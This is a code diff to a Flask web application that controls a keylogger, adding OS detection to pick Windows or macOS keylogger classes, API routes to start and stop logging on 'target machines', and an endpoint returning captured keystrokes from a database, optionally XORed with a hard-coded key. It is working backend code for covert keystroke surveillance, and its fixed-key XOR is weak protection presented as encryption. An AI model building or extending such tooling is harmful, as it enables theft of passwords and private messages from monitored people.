@@ -18,6 +18,9 @@ from flask import make_response, request
 from keylogger.macos_keylogger import KeyLogger
 from flask_sqlalchemy import SQLAlchemy
 import sqlite3
+import platform
+from keylogger.windows_keylogger import KeyLogger as WindowsKeyLogger
+from keylogger.macos_keylogger import KeyLogger as MacKeyLogger
 
 
 load_dotenv()
@@ -424,53 +427,14 @@ def get_target_machines_list():
         }
     } for device in devices])
 
-@app.route('/api/get_keystrokes')
-@login_required
-def get_keystrokes():
-    device_id = request.args.get('machine')
-    show_encrypted = request.args.get('encrypted', 'false').lower() == 'true'
-    
-    app.logger.info(f"Fetching keystrokes for device: {device_id}")
-    
-    if not device_id:
-        return jsonify({"error": "Machine parameter is required"}), 400
-    
-    try:
-        # Get logs from keylogger.db
-        db_path = os.path.join(app.root_path, 'instance', 'keylogger.db')
-        app.logger.info(f"Using database at: {db_path}")
-        
-        conn = sqlite3.connect(db_path)
-        c = conn.cursor()
-        
-        # Get logs for specific device
-        c.execute("""
-            SELECT timestamp, content 
-            FROM keystrokes 
-            WHERE device_id = ? 
-            ORDER BY timestamp DESC
-        """, (device_id,))
-        
-        logs = c.fetchall()
-        conn.close()
-        
-        app.logger.info(f"Found {len(logs)} logs for device {device_id}")
-        
-        if show_encrypted:
-            # Simple XOR encryption with a fixed key
-            key = "SECRET_KEY"  # You can change this key
-            log_data = []
-            for timestamp, content in logs:
-                encrypted_content = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(content))
-                log_data.append(f"[{timestamp}] {encrypted_content}")
-        else:
-            log_data = [f"[{timestamp}] {content}" for timestamp, content in logs]
-        
-        return jsonify({"data": '\n'.join(log_data) if logs else "No logs available"})
-        
-    except Exception as e:
-        app.logger.error(f"Error in get_keystrokes: {str(e)}")
-        return jsonify({"error": str(e)}), 500
+def get_keylogger_class():
+    system = platform.system().lower()
+    if system == 'windows':
+        return WindowsKeyLogger
+    elif system == 'darwin':  # macOS
+        return MacKeyLogger
+    else:
+        raise NotImplementedError(f"Keylogger not implemented for {system}")
 
 @app.route('/api/toggle_logging', methods=['POST'])
 @login_required
@@ -479,7 +443,7 @@ def toggle_logging():
     device_id = data.get('device_id')
     action = data.get('action')
     
-    app.logger.info(f"Toggle logging request: device_id={device_id}, action={action}")  # Debug log
+    app.logger.info(f"Toggle logging request: device_id={device_id}, action={action}")
     
     try:
         device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
@@ -495,23 +459,23 @@ def toggle_logging():
             # Create new keylogger instance if not exists
             if device_id not in app.keyloggers:
                 db_path = os.path.join(app.root_path, 'instance', 'keylogger.db')
-                app.logger.info(f"Creating keylogger with db_path: {db_path}")  # Debug log
-                app.keyloggers[device_id] = KeyLogger(db_path)
+                KeyLoggerClass = get_keylogger_class()
+                app.logger.info(f"Creating {KeyLoggerClass.__name__} with db_path: {db_path}")
+                app.keyloggers[device_id] = KeyLoggerClass(db_path)
             
             # Start the keylogger
             result = app.keyloggers[device_id].start_logging(device_id)
             device.is_active = True
             db.session.commit()
-            app.logger.info(f"Keylogger start result: {result}")  # Debug log
+            app.logger.info(f"Keylogger start result: {result}")
             return jsonify({"message": result, "is_active": True})
             
         elif action == 'stop':
             if device_id in app.keyloggers:
                 result = app.keyloggers[device_id].stop_logging()
-                del app.keyloggers[device_id]
                 device.is_active = False
                 db.session.commit()
-                app.logger.info(f"Keylogger stop result: {result}")  # Debug log
+                app.logger.info(f"Keylogger stop result: {result}")
                 return jsonify({"message": result, "is_active": False})
             return jsonify({"message": "Keylogger was not running", "is_active": False})
             
@@ -599,6 +563,54 @@ def remove_device():
         return jsonify({"error": "Device not found"}), 404
     except Exception as e:
         app.logger.error(f"Error removing device: {e}")
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/api/get_keystrokes')
+@login_required
+def get_keystrokes():
+    device_id = request.args.get('machine')
+    show_encrypted = request.args.get('encrypted', 'false').lower() == 'true'
+    
+    app.logger.info(f"Fetching keystrokes for device: {device_id}")
+    
+    if not device_id:
+        return jsonify({"error": "Machine parameter is required"}), 400
+    
+    try:
+        # Get logs from keylogger.db
+        db_path = os.path.join(app.root_path, 'instance', 'keylogger.db')
+        app.logger.info(f"Using database at: {db_path}")
+        
+        conn = sqlite3.connect(db_path)
+        c = conn.cursor()
+        
+        # Get logs for specific device
+        c.execute("""
+            SELECT timestamp, content 
+            FROM keystrokes 
+            WHERE device_id = ? 
+            ORDER BY timestamp DESC
+        """, (device_id,))
+        
+        logs = c.fetchall()
+        conn.close()
+        
+        app.logger.info(f"Found {len(logs)} logs for device {device_id}")
+        
+        if show_encrypted:
+            # Simple XOR encryption with a fixed key
+            key = "SECRET_KEY"  # You can change this key
+            log_data = []
+            for timestamp, content in logs:
+                encrypted_content = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(content))
+                log_data.append(f"[{timestamp}] {encrypted_content}")
+        else:
+            log_data = [f"[{timestamp}] {content}" for timestamp, content in logs]
+        
+        return jsonify({"data": '\n'.join(log_data) if logs else "No logs available"})
+        
+    except Exception as e:
+        app.logger.error(f"Error in get_keystrokes: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
